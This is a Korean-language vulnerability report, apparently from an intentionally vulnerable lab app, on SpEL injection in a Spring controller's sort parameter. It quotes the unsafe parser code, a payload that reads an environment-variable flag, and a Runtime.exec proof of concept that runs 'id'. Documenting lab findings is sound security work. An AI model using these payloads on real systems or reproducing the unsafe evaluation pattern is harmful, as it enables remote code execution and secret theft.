# VULN-002 SpEL Injection in product sort

- 대상 스택: java-spring
- 심각도: Critical (RCE 가능)
- 분류: A03:2021 Injection (Expression Language Injection)

## 위치

`apps/java-spring/src/main/java/com/vulnlab/shop/controller/ProductController.java`, `GET /api/products` — `sort` 쿼리 파라미터를 그대로 `SpelExpressionParser`에 넘겨 `Product` 엔티티를 루트 객체로 평가한다.

```java
ExpressionParser parser = new SpelExpressionParser();
Expression expression = parser.parseExpression(sort);
...
Object value = expression.getValue(new StandardEvaluationContext(product));
```

정상 사용 시(`sort=price`, `sort=name`)는 단순 프로퍼티 접근으로 동작하지만, SpEL은 프로퍼티 경로가 아니라 완전한 표현식 언어라 `T(...)` 타입 참조로 임의 정적 메서드를 호출할 수 있다. 평가 결과는 응답의 `sortKeys` 배열에 그대로 노출된다(정렬 기준값을 보여주기 위한 디버그성 필드).

## 트리거 방법

```
GET /api/products?sort=T(System).getenv('FLAG_VULN_002')
```

`sortKeys[0]`(또는 상품이 1개뿐이면 유일한 값)에 `FLAG_VULN_002` 환경변수 값이 그대로 출력된다.

동일한 원리로 임의 코드 실행까지 가능하다 (실제 실행은 하지 않았음 — PoC만 남김):

```
sort=new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).useDelimiter("\A").next()
```

## 영향

- 환경변수/시스템 프로퍼티 임의 조회.
- `Runtime.exec` 등을 통한 임의 명령 실행(RCE) — 컨테이너 전체 장악 가능.

## 플래그

`FLAG_VULN_002` (루트 `.env`) → 위 `T(System).getenv(...)` 페이로드로 `sortKeys`에서 획득.

## 조치 상태: 미조치
